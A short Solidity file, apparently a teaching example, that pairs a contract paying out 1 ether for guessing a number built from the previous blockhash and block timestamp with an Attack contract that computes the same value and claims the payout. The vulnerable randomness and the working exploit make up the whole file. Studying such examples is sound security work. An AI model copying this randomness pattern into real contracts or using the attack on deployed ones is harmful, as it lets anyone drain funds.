// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract GuessTheRandomNumber
{
    constructor() public payable {}

    function guess (uint _guess) public
    {
        uint answer = uint (keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

        if (_guess == answer) 
        {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send ether");
        }

    }
}

contract Attack
{
    fallback() external payable {}

    function attack (GuessTheRandomNumber guessTheRandomNumber) public
    {
        uint answer = uint (keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

        guessTheRandomNumber.guess(answer);
    }
}